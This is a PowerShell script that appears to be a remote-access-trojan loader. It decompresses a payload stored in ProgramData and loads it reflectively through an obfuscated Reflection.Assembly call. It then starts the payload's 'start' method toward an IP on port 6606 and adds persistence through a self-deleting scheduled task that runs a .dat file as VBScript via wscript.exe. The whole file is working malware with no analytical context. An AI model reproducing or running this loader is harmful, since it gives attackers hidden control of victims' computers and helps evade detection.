function Wait-OnMutex
{
#This is going be the best script for us to do the testing
    param(
    [parameter(Mandatory = $true)][string] $MutexId
    )

    try
    {
        $MutexInstance = New-Object System.Threading.Mutex -ArgumentList 'false', $MutexId

        if (-not $MutexInstance.WaitOne(10000))
        {
            Exit;
        }

        return $MutexInstance
    } 
    catch [System.Threading.AbandonedMutexException] 
    {
        $MutexInstance = New-Object System.Threading.Mutex -ArgumentList 'false', $MutexId
        return Wait-OnMutex -MutexId $MutexId
    }
}


Function Load { 
param(
[String]$URI=$null,

[String]$Path=$null,

[String]$IP="",

[int]$Port=6606
);
    function SOijcjgee {
        [CmdletBinding()] 
        Param (
        [Parameter(Position = 0, Mandatory = $True)] 
        [byte[]] $byteArray = $(Throw("-byteArray is required")) ); 

        Process { 
        $input = New-Object System.IO.MemoryStream(, $byteArray );
        $output = New-Object System.IO.MemoryStream;
        $eifjoijxoij = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress);
        $eifjoijxoij.CopyTo( $output );
        $eifjoijxoij.Close();
        $input.Close();
        [byte[]] $byteOutArray = $output.ToArray();
        return $byteOutArray;
        }
    }

    Add-type -Assembly System.Drawing;
    Add-Type -Assembly System.Windows.Forms;
    Add-Type -Assembly PresentationCore;
    Add-Type -AssemblyName System.Windows.Forms;
    Add-type -AssemblyName System.Drawing;
    
   
    [Byte[]]$bytes = [System.IO.File]::ReadAllBytes($Path);
    

    $length = $bytes.Length;
    [byte[]]$exBytes = SOijcjgee ($bytes);
    $length = $exBytes.Length;
    
	${0m`P5}  =  [TYPe]("{5}{2}{0}{1}{4}{3}" -F'.a','ss','ECtIon','mblY','e','reFl');  .("{3}{0}{2}{1}"-f 'e','iable','t-Var','S') -Name ("{0}{2}{1}"
-f'a','ly','ssemb') -Value (  (&('gi')  ("vARIAB"+"LE:0MP"+"5")).vaLUE::('Lo'+'ad').Invoke(${e`X`BytES}));


    foreach ($type in $assembly.GetTypes()){
        foreach ($method in $type.GetMethods()){          

            if (($method.Name.ToLower()).equals("start"))
            {
                $method.Invoke($null, @($IP, $Port));
            }
        }
    }

}


$MutexInstance = Wait-OnMutex -MutexId 'ActivateMutexId29873'

$end = {
    param($SelfPath)
    Start-Sleep -Seconds 3600
    
    $res = [System.Diagnostics.Process]::GetCurrentProcess()
        $pid = $res.ID

    $t = New-ScheduledTaskTrigger -Once -At (get-date).AddSeconds(10); 
    $t.EndBoundary = (get-date).AddSeconds(60).ToString('s');
    $arg = "//b //e:vbscript c:\\programdata\\Template5824\\678258.dat"
    Register-ScheduledTask -Force -TaskName JustTrying -Action (New-ScheduledTaskAction -Execute "wscript.exe" -Argument $arg) -Trigger $t -Settin
gs (New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter 00:00:01)

    
    taskkill /PID $pid /f     
}

$MaxRunspaces = 5

$RunspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxRunspaces)
$RunspacePool.Open()

$PowerShell = [powershell]::Create()
$PowerShell.RunspacePool = $RunspacePool
$PowerShell.AddScript($end).AddArgument($MyInvocation.MyCommand.Path) | Out-Null

$JobObj = New-Object -TypeName PSObject -Property @{
	Runspace = $PowerShell.BeginInvoke()
	PowerShell = $PowerShell  
}


$ip = "10.1.1.1";
$port = 6606;
if($args[0] -ne $null)
{
    $ip = $args[0]
}
if($args[1] -ne $null)
{
    $port = $args[1]
}

Load -Path "C:\\ProgramData\\Template5824\\689024.tmp"  -IP $ip -Port $port;

$MutexInstance.ReleaseMutex()
